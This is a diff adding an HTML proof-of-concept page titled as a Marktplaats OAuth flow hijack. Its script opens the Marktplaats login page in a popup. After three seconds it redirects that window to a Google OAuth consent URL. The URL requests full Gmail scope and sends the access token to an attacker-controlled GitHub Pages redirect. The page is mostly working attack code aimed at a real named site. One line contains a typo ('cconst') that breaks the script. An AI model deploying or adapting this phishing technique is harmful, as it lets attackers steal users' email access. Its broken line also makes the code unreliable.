@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>OAuth Hijack Test</title>
+</head>
+<body>
+  <h2>Marktplaats OAuth Flow Hijack PoC</h2>
+  <button onclick="launch()">Start Attack</button>
+
+  <script>
+    const loginTarget = "https://www.marktplaats.nl/identity/v2/login";
+    cconst maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=YOUR_CLIENT_ID&redirect_uri=https://YOUR_GITHUB_USERNAME.github.io/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
+    function launch() {
+      const win = window.open(loginTarget, "_blank", "width=900,height=700");
+      setTimeout(() => {
+        try {
+          win.location.replace(maliciousOAuthUrl);
+          console.log("Redirected login window to malicious OAuth client.");
+        } catch (err) {
+          console.warn("Window manipulation blocked:", err);
+        }
+      }, 3000);
+    }
+  </script>
+</body>
+</html>
